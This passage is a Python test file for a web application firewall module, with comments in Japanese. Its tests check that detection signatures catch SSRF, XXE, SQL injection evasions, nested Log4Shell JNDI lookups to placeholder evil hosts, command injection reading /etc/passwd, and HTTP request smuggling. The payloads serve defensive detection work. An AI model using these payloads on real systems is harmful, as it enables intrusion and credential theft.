        assert sh.inspect("203.0.113.81", path="/", query="next=//evil.com/x").get("action") != "allow"


def test_spring4shell_always_on_and_optional_sigs_toggle():
    # evolution #2 深掘り: Spring4Shell(class.module.classLoader)は低FP=常時ON。
    # SSTI / 内部SSRF は高FP=既定OFF・cfg で個別に検知対象/非対象を選べる。
    import tempfile
    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
    assert dict(_SIG_RE)["proto"].search(_normalize_for_scan("x=class.module.classLoader.y"))
    with tempfile.TemporaryDirectory() as tmp:
        sh = ND.NetShield(state_dir=tmp)
        sh.enable()
        # 既定: 高FPシグネチャは OFF → inspect でヒットしない(良性テンプレ/内部IPを誤遮断しない)
        assert sh.inspect("203.0.113.70", path="/", query="n={{7*7}}").get("action") == "allow"
        assert sh.inspect("203.0.113.71", path="/", query="u=http://127.0.0.1/x").get("action") == "allow"
        info = sh.list_signatures()
        assert {b["name"]: b["enabled"] for b in info["builtin"]}["ssti"] is False
        assert "ssti" in info["optional_signatures"]
        # ON にすると検知される(検知対象に選択)
        assert sh.set_optional_signature("ssti", True).get("ok") is True
        assert sh.set_optional_signature("ssrf_internal", True).get("ok") is True
        assert sh.inspect("203.0.113.72", path="/", query="n={{7*7}}").get("action") != "allow"
        assert sh.inspect("203.0.113.73", path="/", query="u=http://127.0.0.1/x").get("action") != "allow"
        # 非対象に戻せる + 設定は永続化(別インスタンスでも OFF が復元)
        assert sh.set_optional_signature("ssti", False).get("ok") is True
        assert sh.inspect("203.0.113.74", path="/", query="n={{7*7}}").get("action") == "allow"
        assert sh.set_optional_signature("unknown", True).get("ok") is False
        sh2 = ND.NetShield(state_dir=tmp)
        sh2.enable()
        # ssrf_internal は True で永続化済み
        assert sh2.inspect("203.0.113.75", path="/", query="u=http://127.0.0.1/x").get("action") != "allow"


def test_crlf_header_injection_and_xxe_are_caught():
    # evolution #2 深掘り(小粒): CRLF/レスポンスヘッダ注入(%0d%0aSet-Cookie:…)と XXE(<!ENTITY…)。
    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
    rgx = dict(_SIG_RE)
    for s in ["next=%0d%0aSet-Cookie:%20sid=evil", "u=%0d%0aLocation:%20http://e",
              "x=%0d%0aContent-Type:%20text/html"]:
        assert rgx["crlf"].search(_normalize_for_scan(s)), s
    for s in ['d=<!ENTITY xxe SYSTEM "file:///etc/passwd">',
              'x=<!DOCTYPE r [<!ENTITY a SYSTEM "http://e">]',
              'y=<!DOCTYPE foo SYSTEM "http://evil/x.dtd">']:
        assert rgx["xxe"].search(_normalize_for_scan(s)), s
    # 低誤検知: ?location=/ Cookie名/ <!DOCTYPE html>(system無し)/ Content-Type 値は flag しない
    for s in ["?location=tokyo", "?set=1&cookie=2", "?html=<!DOCTYPE html>", "?type=text/html"]:
        assert not rgx["crlf"].search(_normalize_for_scan(s)), s
        assert not rgx["xxe"].search(_normalize_for_scan(s)), s


def test_proto_pollution_and_extra_xss_schemes_are_caught():
    # evolution #2 深掘り(小粒): プロトタイプ汚染(__proto__/constructor…prototype)と
    # data:text/html / vbscript: の XSS スキームを捕捉。いずれも低誤検知。
    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
    rgx = dict(_SIG_RE)
    for s in ["?__proto__[admin]=1", "?a[constructor][prototype][x]=1",
              "obj.constructor.prototype.x=1"]:
        assert rgx["proto"].search(_normalize_for_scan(s)), s
    for s in ["src=data:text/html;base64,PHNjcmlwdD4=", "href=vbscript:msgbox(1)"]:
        assert rgx["xss"].search(_normalize_for_scan(s)), s
    # 低誤検知: 単語 constructor/prototype 単独・data:image・proto という語は flag しない
    for s in ["?name=constructor", "?type=prototype-demo", "?img=data:image/png;base64,iVBOR",
              "?proto=https"]:
        assert not rgx["proto"].search(_normalize_for_scan(s)), s
        assert not rgx["xss"].search(_normalize_for_scan(s)), s


def test_ssrf_cloud_metadata_is_caught():
    # evolution #2 深掘り: SSRF クラウドメタデータ(IMDS 169.254.169.254 等)= 資格情報窃取の的。
    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
    ssrf = dict(_SIG_RE)["ssrf"]
    for s in ["url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
              "next=http://metadata.google.internal/computeMetadata/v1/",
              "target=http://100.100.100.200/latest/meta-data/",
              "u=http://[fd00:ec2::254]/latest/meta-data/"]:
        assert ssrf.search(_normalize_for_scan(s)), s
    # 部分一致や正規の内部IP・パスは誤検知しない
    for s in ["?ip=192.168.1.10", "?host=10.0.0.1", "?ver=169.254", "?path=/latest/news"]:
        assert not ssrf.search(_normalize_for_scan(s)), s


def test_attacks_in_non_ua_headers_are_scanned():
    # evolution #2 深掘り: Log4Shell/SQLi は Referer/X-Forwarded-For/Cookie 等あらゆるヘッダから
    # 来る。inspect が headers も走査面に含め、proxy が攻撃者制御ヘッダ値を集約することを実証。
    import tempfile
    from dataplane.engine.services.proxy import _scan_header_values
    with tempfile.TemporaryDirectory() as tmp:
        sh = ND.NetShield(state_dir=tmp)
        sh.enable()
        # ヘッダ経由の各攻撃が検知される(action は allow ではない)
        for hv in ["x=${jndi:ldap://e/a}", "ref=1 union select a from b where c=1",
                   "c=1;cat /etc/passwd", "id[$ne]=1"]:
            d = sh.inspect("203.0.113.50", path="/", headers=hv)
            assert d.get("action") != "allow", (hv, d)
        # 良性なヘッダ値は通す
        assert sh.inspect("203.0.113.51", path="/",
                          headers="https://ref/p?a=1 1.2.3.4 sid=abcdef").get("action") == "allow"
    # 集約器は Referer/XFF/Cookie + Accept*(攻撃者制御=Log4Shell の運び手・#41 で走査対象に)を拾い、
    # Host/User-Agent は除外する(inspect が別フィールドとして走査=二重走査回避)。
    buf = (b"GET / HTTP/1.1\r\nHost: x\r\nUser-Agent: UA\r\nAccept: text/html\r\n"
           b"Referer: http://r/p\r\nX-Forwarded-For: 1.2.3.4\r\nCookie: s=abc\r\n\r\n")
    got = _scan_header_values(buf)
    assert "http://r/p" in got and "1.2.3.4" in got and "s=abc" in got
    assert "text/html" in got                          # #41: Accept* も走査対象に含める
    assert "UA" not in got and "x" not in got.split()  # Host/UA は集約から除外(別途走査)


def test_redos_custom_signature_blocked_at_compile_time():
    # evolution #2 深掘り: カスタム署名の検証は add_signature だけでなく *コンパイル時* にも効かせ、
    # 改竄/レガシーな署名ファイル経由の ReDoS パターンを live エンジンへ載せない(自己DoS防止)。
    import json
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        sh = ND.NetShield(state_dir=tmp)
        with open(sh._sig_path, "w", encoding="utf-8") as f:    # add_signature を通さず直接書く
            json.dump({"signatures": [
                {"name": "evil", "pattern": r"(a+)+$", "weight": 40, "enabled": True},
                {"name": "evil2", "pattern": r"(.*)*x", "weight": 40, "enabled": True},
                {"name": "good", "pattern": r"evilbot", "weight": 40, "enabled": True},
            ]}, f)
        sh._load_sigs()
        live = [c[0] for c in sh._custom_re]
        assert live == ["good"], live                # 危険2件は除外、安全1件のみ live
        assert sh._custom_blocked == 2
        assert sh.list_signatures()["custom_blocked"] == 2
    # add_signature の API 側検証も従来どおり効く
    with tempfile.TemporaryDirectory() as tmp:
        sh = ND.NetShield(state_dir=tmp)
        assert sh.add_signature("z", r"(a+)+$").get("ok") is False


def test_xss_event_handler_and_nested_jndi_are_caught():
    # evolution #2 深掘り(全部): タグ内 onXxx= のハンドラ型 XSS と、Log4Shell の入れ子難読化。
    from dataplane.engine.lifeform.pipeline import (
        _normalize_for_scan, _SIG_RE, _xss_event_handler_suspect)
    jndi = dict(_SIG_RE)["jndi"]
    # ハンドラ型 XSS(個別ハンドラ名を列挙せず構造で捕捉)
    for s in ["<svg onload=alert(1)>", "<body onload=alert(1)>", "<a onmouseover=alert(1)>",
              "<div onclick=alert(1)>", "<svg/onload=alert(1)>", "<details ontoggle=alert(1)>",
              "<input onfocus=alert(1) autofocus>", "<marquee onstart=alert(1)>"]:
        assert _xss_event_handler_suspect(_normalize_for_scan(s)), s
    # 低誤検知: <タグ を伴わない素の引数や、ハンドラ無しのタグは flag しない
    for s in ["?onload=1", "?q=onclick+demo", "<p>hello world</p>", "?title=Mr. Bond"]:
        assert not _xss_event_handler_suspect(_normalize_for_scan(s)), s
    # Log4Shell 入れ子難読化(${lower:j} / ${::-j} / ${upper:i} / ${env:X:-j})を jndi: として露出
    for s in ["${jndi:ldap://e/a}", "${${lower:j}ndi:ldap://e/a}",
              "${${::-j}${::-n}${::-d}${::-i}:ldap://e}", "${jnd${upper:i}:rmi://h}",
              "${${env:FOO:-j}ndi:dns://x}"]:
        assert jndi.search(_normalize_for_scan(s)), s
    # benign テンプレート(${cart.total} 等)は jndi として誤検知しない
    for s in ["?price=${cart.total}", "?t=${user.name}", "?d=${date:yyyy}"]:
        assert not jndi.search(_normalize_for_scan(s)), s


def test_new_attack_classes_blind_sqli_nosql_lfi_jndi():
    # evolution #2 深掘り(全部): union/恒真式に出ない別系統の攻撃クラスを追加で捕捉。
    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
    def hits(p):
        b = _normalize_for_scan(p)
        return {n for n, r in _SIG_RE if r.search(b)}
    assert "sqli_blind" in hits("1 and sleep(5)")
    assert "sqli_blind" in hits("1;waitfor delay '0:0:5'")
    assert "sqli_blind" in hits("1 and extractvalue(1,concat(0x7e,version()))")
    assert "sqli_blind" in hits("x into outfile '/tmp/a'")
    assert "nosqli" in hits("id[$ne]=1")
    assert "nosqli" in hits('{"$where":"1==1"}')
    assert "lfi" in hits("file=php://filter/resource=index")
    assert "lfi" in hits("url=gopher://127.0.0.1:6379")
    assert "jndi" in hits("x=${jndi:ldap://evil/a}")
    # 低誤検知: PHP/Rails の配列添字($接頭なし)、英単語 sleepy、通常 https は flag しない
    for benign in ["filter[name]=bob", "?items[0]=x&items[1]=y", "?q=sleepy+town",
                   "https://example.com/path", "/files/report.pdf", "?sort=name&page=2"]:
        assert hits(benign) == set(), (benign, hits(benign))


def test_union_select_separator_evasion_is_caught():
    # evolution #2 深掘り: UNION SELECT の間を括弧/ALL/DISTINCT で割る定番回避
    # (UNION(SELECT…) / UNION ALL SELECT)を構造で捕捉する。空白限定を卒業。
    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
    sqli = dict(_SIG_RE)["sqli"]
    for s in ["1 union select a from b", "1 union(select(a)from(b))",
              "1 union all select a", "1 union distinct select a",
              "1/*!union*/(/*!select*/a)", "1 union  (  select a"]:
        assert sqli.search(_normalize_for_scan(s)), s
    # 語境界つきなので benign(英単語に union/select を含む)は誤検知しない
    for s in ["?q=onion+rings", "?genre=fusion&type=selection",
              "/union-station/select-menu"]:
        assert not sqli.search(_normalize_for_scan(s)), s


def test_mysql_versioned_comment_evasion_is_caught():
    # evolution #2 深掘り: MySQL 版付きコメント /*!...*/ は DB が中身を実行する。一般コメントと
    # 同様に中身ごと消すと UNION 等が検出から消える(sqlmap versionedkeywords 回避)。囲みだけ
    # 剥がして中身を残すことで捕捉する。
    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
    sqli = dict(_SIG_RE)["sqli"]
    for s in ["1/*!50000UNION*/SELECT/*!password*/FROM/**/users WHERE a=1",
              "/*!UNION*//*!SELECT*/1 from a where b=1",
              "1/*!50000UNION*//*!50000SELECT*/pass FROM u WHERE a=1"]:
        assert sqli.search(_normalize_for_scan(s)), s
    # 一般コメントの除去は維持(中身は無害化)・benign は誤検知しない
    assert sqli.search(_normalize_for_scan("1/**/UNION/**/SELECT a from b where c=1"))
    for s in ["desc=2*3/*note*/", "?a=1&b=2", "/path/to/page"]:
        assert not any(r.search(_normalize_for_scan(s)) for _n, r in _SIG_RE), s


def test_newline_injected_separator_is_caught():
    # evolution #2 深掘り: %0a/%0d で注入した改行はサーバ側でコマンド/文の区切りになる。
    # 区切り ; へ正規化し、; ベースの既存検知(RCE/stacked SQL)が改行注入にも効くことを実証。
    from dataplane.engine.lifeform.pipeline import (
        _normalize_for_scan, _SIG_RE, _stacked_query_suspect)
    rgx = dict(_SIG_RE)
    # 改行で区切られたコマンド注入 → RCE として捕捉(従来は \s 畳みで素通り)
    for s in ["127.0.0.1%0acat /etc/passwd", "127.0.0.1%0d%0awget x", "a%0a%0d;bash"]:
        assert rgx["rce"].search(_normalize_for_scan(s)), s
    # 改行で区切られた複文 SQL → stacked として捕捉
    assert _stacked_query_suspect(_normalize_for_scan("q%0a%0aselect a from b"))
    # 正規の生改行を持たない通常の query は影響を受けない(誤検知しない)
    for s in ["?a=1&b=2", "/index.html", "?q=hello+world&sort=name", "user=alice&id=42"]:
        b = _normalize_for_scan(s)
        assert not any(r.search(b) for _n, r in _SIG_RE), s


def test_html_entity_encoded_xss_is_decoded_and_caught():
    # evolution #2 深掘り: 実体エンコード(&lt; / &#60; / &#x3c;)で XSS シグネチャを
    # すり抜ける回避を、;終端エンティティの復号で無効化する。
    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
    xss = dict(_SIG_RE)["xss"]
    evade = ["&lt;script&gt;alert(1)", "&#60;script&#62;", "&#x3c;script&#x3e;",
             "%26lt%3bscript%26gt%3b",                # 二重符号化(%→&lt;→<)も貫通
             "&lt;img src=x onerror=1&gt;"]
    for s in evade:
        assert xss.search(_normalize_for_scan(s)), s   # 復号後に XSS として捕捉
    # ;の無い legacy 実体は復号しない=REST フィルタ引数(gt/lt)を誤検知しない
    for s in ["?price_gt=10&price_lt=100", "?lt=100&gt=10", "?a=1&sort=name",
              "user=alice&id=42", "?q=fish&chips"]:
        assert not xss.search(_normalize_for_scan(s)), s


def test_http_smuggling_framing_is_rejected():
    # ルート1(HTTPリクエストスマグリング): 曖昧な本文境界を構造で検出して拒否(evolution #5)。
    from dataplane.engine.services.proxy import _framing_ambiguous
    H = b"POST / HTTP/1.1\r\nHost: x\r\n"
    clte = (H + b"Content-Length: 43\r\nTransfer-Encoding: chunked\r\n\r\n"
            b"0\r\n\r\nGET /.env HTTP/1.1\r\n\r\n")
    bad = {
        "CL.TE": clte,
        "dup-CL": H + b"Content-Length: 5\r\nContent-Length: 6\r\n\r\n",
        "bare-LF": H + b"Content-Length: 5\nTransfer-Encoding: chunked\r\n\r\n",
        "CL-hex": H + b"Content-Length: 0x10\r\n\r\n",
        "CL-sign": H + b"Content-Length: +5\r\n\r\n",
        "CL-comma": H + b"Content-Length: 5, 5\r\n\r\n",
        "TE.TE": H + b"Transfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n",
        "TE-not-last-chunked": H + b"Transfer-Encoding: chunked, gzip\r\n\r\n",
        "TE-identity": H + b"Transfer-Encoding: identity\r\n\r\n",
        "name-space-CL": H + b"Content-Length : 5\r\n\r\n",
        # 深掘り(行構造・ヘッダ整合性)
        "bare-CR": H + b"Content-Length: 5\rTransfer-Encoding: chunked\r\n\r\n",
        "obs-fold": H + b"Transfer-Encoding: chunked\r\n , x\r\n\r\n",
        "dup-Host": H + b"Host: evil\r\n\r\n",
        "reqline-2space": b"POST  / HTTP/1.1\r\nHost: x\r\n\r\n",
        "reqline-badver": b"POST / HTTP/2.0\r\nHost: x\r\n\r\n",
        "reqline-badmethod": b"GE+T / HTTP/1.1\r\nHost: x\r\n\r\n",
        "reqline-extra-token": b"GET / HTTP/1.1 x\r\nHost: x\r\n\r\n",
        # 深掘り step3(Host 必須 / NUL)
        "http11-no-host": b"GET / HTTP/1.1\r\nUser-Agent: x\r\n\r\n",
        "nul-in-header": H + b"X: a\x00b\r\n\r\n",
        "nul-in-reqline": b"GET /\x00 HTTP/1.1\r\nHost: x\r\n\r\n",
    }
    for label, raw in bad.items():
        assert _framing_ambiguous(raw) is True, label    # 曖昧 → 拒否
    good = {
        "single-CL": b"GET /index.html HTTP/1.1\r\nHost: x\r\nContent-Length: 10\r\n\r\n",
        "no-body-GET": b"GET / HTTP/1.1\r\nHost: x\r\n\r\n",
        "plain-chunked": H + b"Transfer-Encoding: chunked\r\n\r\n0\r\n\r\n",
        "te-coding-then-chunked": H + b"Transfer-Encoding: gzip, chunked\r\n\r\n0\r\n\r\n",
        "CL-ows": H + b"Content-Length:  10 \r\n\r\n",   # 値前後のOWSは正常
        "options-star": b"OPTIONS * HTTP/1.1\r\nHost: x\r\n\r\n",
        "query-target": b"GET /a?b=c&d=e HTTP/1.0\r\nHost: x\r\n\r\n",
        "single-Host": H + b"Content-Length: 0\r\n\r\n",
        "http10-no-host": b"GET / HTTP/1.0\r\nUser-Agent: x\r\n\r\n",  # 1.0 は Host 任意
    }
    for label, raw in good.items():
        assert _framing_ambiguous(raw) is False, label   # 正常 → 通す


def test_pow_challenge_solution_grants_verification():
    # チェックメイト(PoW未処理→セルフDoS)の核: 解の検証が verified を付与すること。
    import hashlib
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        sh = ND.NetShield(state_dir=tmp)
        ip = "198.51.100.20"
        ch = sh._issue_challenge(ip, difficulty=2)    # 低難易度=テスト高速
        nonce, diff = ch["nonce"], ch["difficulty"]
        sol = 0
        while not hashlib.sha256(f"{nonce}{sol}".encode()).hexdigest().startswith("0" * diff):
            sol += 1
        # 不正解は *確実に* PoW を満たさない文字列にする(偶然満たすと誤って ok=True になりフレーク)
        bad_sol = str(sol + 1)
        while hashlib.sha256(f"{nonce}{bad_sol}".encode()).hexdigest().startswith("0" * diff):
            bad_sol += "x"
        bad = sh.solve_challenge(nonce, bad_sol)             # 不正解は拒否
        assert bad["ok"] is False
        r = sh.solve_challenge(nonce, str(sol))       # 正解 → verify 付与
        assert r["ok"] is True
        assert sh._state(ip)["verified_until"] > _now_dummy()


def _now_dummy():
    import time
    return time.time() - 1


def test_attractive_honeypot_bait_is_zero_fp_oneshot_ban():
    # 「負けない」運用: 偵察AIが欲しがる『美味しい餌』(隠し管理フォルダ/古い特権アカウント/
    # 各種秘密)に触れたら誤検知ゼロ=100%悪意として一発BAN。正規パスは絶対に踏まない。
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        sh = ND.NetShield(state_dir=tmp)
        sh.enable()
        baits = ["/admin/legacy-accounts.csv", "/.ssh/id_rsa", "/admin/backup/",
                 "/.kube/config", "/exports/ad-users-2018.csv", "/old-admin/",
                 "/credentials.json", "/.git/config"]
        for i, p in enumerate(baits):
            d = sh.inspect("203.0.113.%d" % (i + 10), path=p)
            assert d.get("action") == "block", (p, d)      # 一発BAN
        assert len(sh.cfg["honeypots"]) >= 25              # 餌を魅力的に拡充
        # 正規の(管理画面含む)パスは誤検知しない=信頼性が武器
        for p in ["/index.html", "/api/users", "/static/app.js", "/admin/dashboard",
                  "/login", "/health"]:
            assert sh.inspect("203.0.113.99", path=p).get("action") == "allow", p


def test_slowloris_penalty_escalates_to_ban_not_on_single():
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        sh = ND.NetShield(state_dir=tmp)
        ip = "203.0.113.50"
        r1 = sh.penalize(ip, reason="slowloris")
        assert r1["banned"] is False          # 単発では落とさない(正規の低速回線を誤遮断しない)
        banned = False
        for _ in range(5):                    # 反復(score 累積)で BAN へ
            if sh.penalize(ip, reason="slowloris")["banned"]:
                banned = True
                break
        assert banned
        assert ip in sh._ban_bloom            # bloom にも登録=以後 O(1) で瞬殺


def test_async_guard_response_content_length_is_byte_accurate():
    # Gのおっさん対策: 非ASCII本文でも Content-Length は UTF-8 バイト数で厳密一致する。
    from dataplane.engine.services.proxy import _http_response
    raw = _http_response("402 Payment Required", '{"error":"期限切れ"}')
    head, _, body = raw.partition(b"\r\n\r\n")
    import re
    n = int(re.search(rb"Content-Length: (\d+)", head).group(1))
    assert n == len(body)                       # 宣言値 == 実バイト数(文字数ではない)
    assert n == len('{"error":"期限切れ"}'.encode("utf-8"))
    assert n != len('{"error":"期限切れ"}')       # 文字数とは一致しない(=ズレ防止の要)


def test_dashboard_controls():
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        ofw, osh = FW._FW, ND._SHIELD
        adm, url, token = _admin_with_temp(tmp)
        try:
            # shield ON
            _req(url + "/api/shield/toggle", token=token, body={"on": True})
            assert ND._SHIELD.is_enabled() is True
            # firewall deny ルール
            _req(url + "/api/firewall/rule", token=token,
                 body={"net": "203.0.113.0/24", "action": "deny"})
            assert any(r["net"] == "203.0.113.0/24" for r in FW._FW.rules)
            # ハニーポット追加
            _req(url + "/api/shield/honeypot", token=token, body={"path": "/trap.zip"})
            assert "/trap.zip" in ND._SHIELD.cfg["honeypots"]
            # エッジ前衛設定DL(444を含む)
            code, conf = _req(url + "/api/edge", token=token)
            assert code == 200 and b"ngx.exit(444)" in conf
        finally:
            adm.stop()
            FW._FW, ND._SHIELD = ofw, osh


def test_dashboard_oversized_body_is_capped():
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        ofw, osh = FW._FW, ND._SHIELD
        adm, url, token = _admin_with_temp(tmp)
        try:
            # Content-Length 分を無制限に読まない=メモリ枯渇しない。上限超では本文を
            # 1MiB で打ち切るため、応答(200)か接続リセットのどちらかになる。どちらも
            # 「防御として正常(クラッシュ/ハング/OOM しない)」=どちらでも合格とする。
            big = b'{"on":true,"pad":"' + b"A" * (2 << 20) + b'"}'
            req = urllib.request.Request(
                url + "/api/firewall/toggle", data=big,
                headers={"X-Token": token, "Content-Type": "application/json"},
                method="POST")
            try:
                with urllib.request.urlopen(req, timeout=10) as resp:
                    assert resp.status == 200
            except (ConnectionResetError, ConnectionAbortedError,
                    urllib.error.URLError):
                pass                            # 上限打ち切りに伴うリセットは許容(防御成功)
            # 肝心なのは『サーバが生きている』こと=通常リクエストが直後も通る
            code, _ = _req(url + "/api/state", token=token)
            assert code == 200
        finally:
            adm.stop()
            FW._FW, ND._SHIELD = ofw, osh


if __name__ == "__main__":
    fns = [v for k, v in sorted(globals().items())
           if k.startswith("test_") and callable(v)]
    ok = 0
    for fn in fns:
        try:
            fn()
            ok += 1
            print("PASS", fn.__name__)
        except Exception as e:
            print("FAIL", fn.__name__, "->", repr(e))
    print(f"--- {ok}/{len(fns)} passed ---")
